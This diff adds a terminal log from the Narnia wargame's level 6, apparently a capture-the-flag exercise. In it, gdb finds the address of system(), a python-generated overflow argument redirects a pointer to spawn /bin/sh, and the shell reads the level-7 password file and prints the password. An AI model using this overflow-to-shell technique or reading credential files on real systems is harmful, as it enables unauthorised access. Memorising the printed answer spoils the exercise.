@@ -1,0 +1,11 @@
+(gdb) run
+Starting program: /games/narnia/narnia6
+/games/narnia/narnia6 b1 b2
+[Inferior 1 (process 19332) exited with code 0377]
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e65e80 <system>
+(gdb) q
+narnia6@melinda:/narnia$ ./narnia6 $(python -c 'print "a"*8 + "\x80\x5e\xe6\xf7"') $(python -c 'print "a"*8 + "/bin/sh"')
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+$
